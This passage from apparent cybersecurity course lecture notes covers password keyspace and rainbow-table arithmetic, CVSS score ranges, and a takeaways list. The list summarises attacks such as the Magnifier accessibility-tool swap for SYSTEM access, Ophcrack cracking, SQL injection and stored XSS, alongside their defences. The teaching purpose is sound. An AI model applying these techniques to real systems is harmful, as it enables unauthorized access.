  Lowercase only (C=26), length 6: $26^6 = 308,915,776$ combinations
  Alphanumeric (C=62), length 8:   $62^8 = 218,340,105,584,896$ combinations

Rainbow table lookup: $O(L \cdot t)$ per hash
  Where L = chain length, t = number of tables
  Typically reduces cracking time from hours/days to seconds/minutes
  Trade-off: Storage space vs. computation time
```

### CVSS (Common Vulnerability Scoring System)

Nessus uses CVSS to rate vulnerability severity:

```
CVSS v3.1 Score Ranges:
  0.0       = None
  0.1 - 3.9 = Low
  4.0 - 6.9 = Medium
  7.0 - 8.9 = High
  9.0 - 10.0 = Critical

Base Score = roundup(min[(Impact + Exploitability), 10])

Where:
  Impact = measures the consequence of exploitation (Confidentiality, Integrity, Availability)
  Exploitability = measures how easy it is to exploit (Attack Vector, Complexity, Privileges Required)
```

## Key Takeaways

- **Extortion attacks** (ransomware, data exposure threats) are logistically simpler than selling stolen data and are a dominant trend in cybercrime
- **Data manipulation attacks** are the next frontier — they are extremely hard to detect and can cause catastrophic consequences (e.g., corrupting financial records, manipulating stock markets)
- **IoT devices** are a massive, largely unsecured attack surface; always change default credentials and segment IoT networks from critical infrastructure
- **Backdoors** can exist in commercial products from major vendors (Juniper Networks case) and may have state-sponsored origins
- **Zero-day vulnerabilities** are the most dangerous because no patch exists; they are discovered through fuzzing and source code analysis
- **Buffer overflows** remain a critical vulnerability class — understanding memory layout (stack, heap, return addresses) is essential for both exploitation and defense
- **Metasploit and Nessus** are the primary tools for payload deployment and vulnerability scanning, respectively
- **Physical access attacks** (Live CD, Ophcrack, Magnifier exploit) can bypass OS authentication entirely — full-disk encryption is the primary defense
- **The Magnifier exploit** demonstrates that replacing accessibility tools gives SYSTEM-level access, which is more powerful than simply bypassing login
- **SQL injection and XSS** remain among the most prevalent web vulnerabilities — input sanitization and parameterized queries are essential defenses
- **Stored XSS** is more dangerous than reflected XSS because it persists and affects every user who loads the page
- **Nessus** works in four phases: host discovery, port/service identification, vulnerability assessment, and reporting
- **Backported patches** can cause false positives in vulnerability scanners — always verify findings before acting
- **ONC RPC enumeration** via Portmapper (port 111) can reveal NFS and NIS services, which may expose file systems and configuration data
- **SSH banner grabbing** reveals server versions but may not reflect actual security posture due to backported patches
- **Mobile devices** face unique threats: SensorID creates hardware-level fingerprints that survive factory resets; Cellebrite can extract deleted data from encrypted devices
- **Cloud security** operates under a Shared Responsibility Model — organizations must understand which security controls are their responsibility vs. the provider's
- **The university IoT case study** demonstrates real-world botnet propagation through default credentials and the importance of network segmentation

## Connections

**Building on Week 2 (Reconnaissance):** Week 2 covered how attackers gather information about targets (footprinting, scanning, enumeration). Week 3 shows how that gathered information is weaponized — reconnaissance data directly informs which exploits to deploy, which vulnerabilities to target, and which attack vectors are most likely to succeed. The Nessus vulnerability scanner bridges both phases: it performs active reconnaissance (port scanning, service identification) and directly identifies exploitable vulnerabilities.

**Connection to Networking Fundamentals:** Understanding ports (22 for SSH, 111 for Portmapper, 443 for HTTPS), protocols (TCP/UDP, RPC, DNS), and network architecture is essential for both the attack techniques and Nessus scanning covered in this lecture. The DDoS and IoT botnet discussions rely on knowledge of network traffic, DNS resolution, and bandwidth.

**Connection to Operating Systems:** The OS compromise section (Live CD attacks, Magnifier exploit, password cracking with Ophcrack) requires understanding of how operating systems handle authentication, privilege levels (user vs. SYSTEM), the boot process, and the file system layout (System32 directory).

**Connection to Web Development / Databases:** SQL injection and XSS attacks require understanding of how web applications interact with databases (SQL queries), how browsers process JavaScript, and how HTTP sessions and cookies work. These topics connect to database courses and web development fundamentals.

**Looking Ahead:** The techniques covered in this week establish the foundation for understanding defensive countermeasures, incident response, and security architecture that will be covered in later weeks. Knowing how systems are compromised is the prerequisite for learning how to protect them effectively.
